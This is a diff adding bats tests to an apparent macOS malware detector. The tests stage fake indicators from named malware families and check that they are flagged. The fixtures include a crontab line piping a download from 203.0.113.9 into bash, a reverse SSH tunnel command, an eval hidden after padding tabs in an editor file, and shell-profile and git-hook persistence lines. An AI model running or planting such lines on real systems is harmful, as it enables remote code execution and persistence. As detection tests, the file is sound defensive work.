@@ -5,10 +5,11 @@ setup() {
   T="$BATS_TEST_TMPDIR/T"; mkdir -p "$T" "$FORTKEEP_SYSROOT/tmp"
   stub getconf 'exit 1'
   stub crontab 'exit 1'
-  # ps: launchd, plus $PROC ("PID TTY ETIME PROGRAM") and $ARGS ("PID COMMAND") when a test sets them.
+  # ps: launchd, plus $PROC ("PID TTY ETIME PROGRAM"), $ARGS ("PID COMMAND") and $PARENTS ("PID PPID") when a test sets them.
   stub ps 'case "$*" in
   *etime*) echo "    1 ??  10-00:00:00 /sbin/launchd"; [ -z "${PROC:-}" ] || echo "$PROC" ;;
   *command*) echo "    1 /sbin/launchd"; [ -z "${ARGS:-}" ] || echo "$ARGS" ;;
+  *ppid*) echo "    1     0"; [ -z "${PARENTS:-}" ] || echo "$PARENTS" ;;
 esac'
   # lsof: $CWD for the working-folder query, $CONN for the connection list.
   stub lsof 'case "$*" in *cwd*) printf "%s\n" "${CWD:-}" ;; *ESTABLISHED*) printf "%s\n" "${CONN:-}" ;; esac'
@@ -72,6 +73,12 @@ chk() { run env TMPDIR="$T" PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin:/usr/sbin:
   echo '{"dependencies": {"axios": "1", "socket.io-client": "4"}}' > "$HOME/.node_modules/package.json"
   chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.node_modules holds the BeaverTail loader's packages"* ]]
 }
+@test "GD-RT-03 the PolinRider loader's .npm-ws files in ~/.node_modules → FAIL; a look-alike name is only noted" {
+  mkdir "$HOME/.node_modules"; : > "$HOME/.node_modules/.npm-wsx.json"
+  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "~/.node_modules exists without the BeaverTail packages" ]
+  : > "$HOME/.node_modules/.npm-ws.pid"; : > "$HOME/.node_modules/.npm-ws.log"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.node_modules holds the PolinRider loader's files: .npm-ws.pid .npm-ws.log"* ]]
+}
 @test "GD-RT-03 loader staging in a temp folder → FAIL: an npm stage, staged pip packages, a dotfile named after you" {
   mkdir -p "$FORTKEEP_SYSROOT/tmp/.npm/x\$y_123456_654321"
   chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/tmp/.npm/x\$y_123456_654321 is a loader staging folder"* ]]
@@ -119,4 +126,115 @@ chk() { run env TMPDIR="$T" PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin:/usr/sbin:
   stub plutil 'echo "$@" >> "$BATS_TEST_TMPDIR/access.log"; exec /usr/bin/plutil "$@"'
   chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]; [[ "$output" != *bad.plist* ]]
   run grep -F LaunchAgents/ "$BATS_TEST_TMPDIR/access.log"; [ "$status" -ne 0 ]
+}
+@test "GD-RT-03 python fed its code through stdin, detached under launchd for a minute → FAIL; with a parent of its own it's a tool" {
+  PROC='  4343 ??  05:00 /usr/bin/python3' ARGS='  4343 python3 -u -' PARENTS='  4343     1' chk
+  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "python3 (pid 4343) runs code fed through stdin"* ]]
+  PROC='  4343 ??  05:00 /usr/bin/python3' ARGS='  4343 python3 -u -' PARENTS='  4343   900' chk; [ "$(field status)" = PASS ]
+  PROC='  4343 ??  00:20 /usr/bin/python3' ARGS='  4343 python3 -u -' PARENTS='  4343     1' chk; [ "$(field status)" = PASS ]
+}
+@test "GD-RT-03 ssh forwarding any remote port to this Mac's SSH → FAIL; an ordinary autossh tunnel doesn't count" {
+  PROC='  555 ??  10:00 /usr/bin/ssh' ARGS='  555 ssh -N -R *:0:localhost:22 -o ExitOnForwardFailure=yes tunnel@203.0.113.9' chk
+  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "ssh (pid 555) opens a reverse tunnel into this Mac's SSH"* ]]
+  PROC='  556 ??  10:00 /opt/homebrew/bin/autossh' ARGS='  556 autossh -M 0 -N -R 8022:localhost:22 me@203.0.113.9' chk
+  [ "$(field status)" = PASS ]
+}
+@test "GD-RT-03 a connection to the newer C2 addresses → FAIL naming the family; a neighbouring address doesn't count" {
+  for c in "103.179.142.155 a known PolinRider C2 server" "193.32.204.199 GhostAction's C2 server" "85.137.53.71 the Miasma worm's C2 server"; do
+    CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->%s:443' "${c%% *}")" chk
+    [ "$(field status)" = FAIL ]; [[ "$(field note)" == "a connection to ${c%% *}, ${c#* }"* ]]
+  done
+  CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->193.32.204.19:443')" chk; [ "$(field status)" = PASS ]
+}
+@test "GD-RT-03 ChainDrop's, Miasma's, MacSync's and AMOS's files → FAIL by family; a near name doesn't count" {
+  for f in "ChainDrop Library/LaunchAgents/com.user.gh-token-monitor.plist" "ChainDrop .local/bin/gh-token-monitor.sh" \
+    "ChainDrop .config/gh-token-monitor/" "Miasma Library/Application Support/NodeJS/sync.js" "Miasma .config/.miasma/" \
+    "Miasma Library/Application Support/com.apple.spotlight/index-v2.cache" "MacSync Library/Logs/.sysnotif-agent.log"; do
+    p="$HOME/${f#* }"; mkdir -p "${p%/*}"; [ "${p%/}" != "$p" ] || touch "$p"; p="${p%/}"
+    chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/${p#"$HOME"/} exists (a known ${f%% *} file)"* ]]; rm -rf "$p"
+  done
+  mkdir -p "$HOME/Library/Logs" "$HOME/Library/Application Support/com.apple.spotlight"
+  touch "$HOME/Library/Logs/sysnotif-agent.log" "$HOME/Library/Application Support/com.apple.spotlight/index.cache"
+  chk; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
+  mkdir -p "$FORTKEEP_SYSROOT/Library/LaunchDaemons"; : > "$FORTKEEP_SYSROOT/Library/LaunchDaemons/com.finder.helper.plist"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/Library/LaunchDaemons/com.finder.helper.plist exists (a known AMOS file)"* ]]
+}
+@test "GD-RT-03 a ~/.agent that keeps running .helper for the console user → FAIL; generic names alone are only noted" {
+  printf '#!/bin/bash\necho "console user: $(stat -f %%Su /dev/console)"\n' > "$HOME/.agent"; mkdir -p "$HOME/Library/Application Support/System"; : > "$HOME/.mainhelper"
+  chk; [ "$(field status)" = PASS ]
+  [ "$(field note)" = "~/Library/Application Support/System exists: macOS makes no such folder, MacSync does; ~/.mainhelper exists, a file name the AMOS backdoor uses" ]
+  printf 'while true; do\n  u=$(stat -f "%%Su" /dev/console)\n  sudo -u "$u" "$HOME/.helper"\n  sleep 1\ndone\n' > "$HOME/.agent"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.agent keeps running .helper as whoever is logged in"* ]]
+}
+@test "GD-RT-03 the trojanized Claude Code extension's 2.1.312 or 2.1.313 folder in Cursor → FAIL; other versions don't count" {
+  E="$HOME/.cursor/extensions"; mkdir -p "$E/anthropic.claude-code-2.1.314-darwin-arm64" "$E/anthropic.claude-code-2.1.3120"
+  chk; [ "$(field status)" = PASS ]
+  mkdir "$E/Anthropic.claude-code-2.1.313-darwin-arm64"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.cursor/extensions/Anthropic.claude-code-2.1.313-darwin-arm64 is the trojanized Claude Code extension"* ]]
+}
+@test "GD-RT-03 the extension's .stk_ file and MacSync's .sys- payload in a temp folder → FAIL; other lengths don't count" {
+  : > "$T/.stk_0a1b2c3d4"; : > "$T/.sys-12345678"
+  chk; [ "$(field status)" = PASS ]
+  : > "$T/.stk_0a1b2c3d4e"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/.stk_0a1b2c3d4e is the trojanized Claude Code extension's file"* ]]
+  rm "$T/.stk_0a1b2c3d4e"; : > "$FORTKEEP_SYSROOT/tmp/.sys-1234567890123456"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/tmp/.sys-1234567890123456 is where MacSync's dropper puts its payload"* ]]
+}
+@test "GD-RT-03 Miasma's profile block or MacSync's .repair-run line in a start-up file → FAIL by line; a near text doesn't count" {
+  # The marker is assembled here: no file in this repo holds a whole one.
+  printf 'export A=1\n%s\nexport B=2\n' "### Node Auto-""Update ###" > "$HOME/.zshrc"; chk; [ "$(field status)" = PASS ]
+  printf 'export A=1\n%s\n' "### Node Auto-""Update Script ###" > "$HOME/.zshrc"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.zshrc line 2 starts the Miasma worm's auto-update block"* ]]
+  printf '%s\n' '"$HOME/Library/Application Support/System/.repair-run" >/dev/null 2>&1 &' > "$HOME/.zshrc"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.zshrc line 1 runs MacSync's .repair-run script"* ]]
+}
+@test "GD-RT-03 a global git pre-commit or post-checkout hook running .repair-run → FAIL; another hook, or an ordinary one, doesn't count" {
+  printf '[core]\n\thooksPath = ~/.githooks\n' > "$HOME/.gitconfig"; mkdir -p "$HOME/.githooks"
+  printf '#!/bin/sh\ngitleaks protect --staged\n' > "$HOME/.githooks/pre-commit"
+  printf '#!/bin/sh\n"$HOME/.cache/.repair-run" &\n' > "$HOME/.githooks/post-merge"
+  chk; [ "$(field status)" = PASS ]
+  printf '#!/bin/sh\n"$HOME/.cache/.repair-run" &\n' > "$HOME/.githooks/post-checkout"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.githooks/post-checkout runs MacSync's .repair-run script"* ]]
+}
+@test "GD-RT-03 a cron line that pipes a download into a shell, GhostAction's included → FAIL by line; a plain download doesn't count" {
+  stub crontab "cat <<'EOS'
+0 3 * * * curl -s https://x.example/ping > /dev/null
+EOS"
+  chk; [ "$(field status)" = PASS ]
+  m="#gh""c2"  # GhostAction's marker, assembled here
+  stub crontab "cat <<'EOS'
+# keep
+*/5 * * * * curl -s -m 10 http://203.0.113.9:8080/c2/\$(hostname) | bash  $m
+EOS"
+  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 sign(s) of live malware on this Mac" ]
+  [[ "$(field note)" == "your crontab line 2 runs downloaded code"* ]]
+  stub crontab "echo '*/5 * * * * /usr/local/bin/sync-x  $m'"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "your crontab line 1 runs downloaded code"* ]]
+}
+@test "GD-RT-03 MacSync's com.apple.finder.agent label → FAIL; other Apple labels in your own LaunchAgents are counted in a note, never named" {
+  A="$HOME/Library/LaunchAgents"; mkdir -p "$A"
+  agent() { printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>%s</string><key>ProgramArguments</key><array><string>/usr/bin/true</string></array></dict></plist>\n' "$2" > "$A/$1.plist"; }
+  agent mine com.example.finder.agent; agent cert com.apple.CSConfigDotMacCert-someone@me.example-SharedServices.Agent
+  chk; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
+  agent odd com.apple.updater; chk; [ "$(field status)" = PASS ]
+  [ "$(field note)" = "1 agent(s) in your own LaunchAgents use an Apple label, as malware does to blend in: worth a look" ]
+  agent finder com.apple.finder.agent
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/Library/LaunchAgents/finder.plist is MacSync's LaunchAgent"* ]]
+}
+@test "GD-RT-03 an editor or app start-up file carrying PolinRider's patch → FAIL; ordinary code doesn't; a private folder isn't read" {
+  M="$FORTKEEP_SYSROOT/Applications/Cursor.app/Contents/Resources/app/out"; mkdir -p "$M"
+  printf 'console.log(1);\t\t\teval(x); // M2606\n' > "$M/main.js"; chk; [ "$(field status)" = PASS ]
+  { printf 'console.log(1);'; printf '\t%.0s' $(seq 60); printf 'eval(x);\n'; } > "$M/main.js"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/Applications/Cursor.app/Contents/Resources/app/out/main.js is patched by PolinRider's second stage"* ]]
+  printf 'console.log(1);eval(atob("eA=="));\n' > "$M/main.js"; chk; [ "$(field status)" = FAIL ]
+  rm "$M/main.js"; D="$HOME/Library/Application Support/discord"; mkdir -p "$D/0.0.300/modules/discord_desktop_core"
+  printf "module.exports = require('./core.asar');\n/*%s*/\n" "M26063""0A" > "$D/0.0.300/modules/discord_desktop_core/index.js"
+  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/Library/Application Support/discord/0.0.300/modules/discord_desktop_core/index.js is patched"* ]]
+  echo "$D" > "$FORTKEEP_PRIVATE_PATHS"
+  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]
+}
+@test "GD-RT-03 an editor start-up file it can't read is noted, never taken as clean" {
+  M="$FORTKEEP_SYSROOT/Applications/Visual Studio Code.app/Contents/Resources/app/out"; mkdir -p "$M"
+  echo 'console.log(1);' > "$M/main.js"; chmod 000 "$M/main.js"
+  chk; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"/Visual Studio Code.app/Contents/Resources/app/out/main.js couldn't be read" ]]
 }
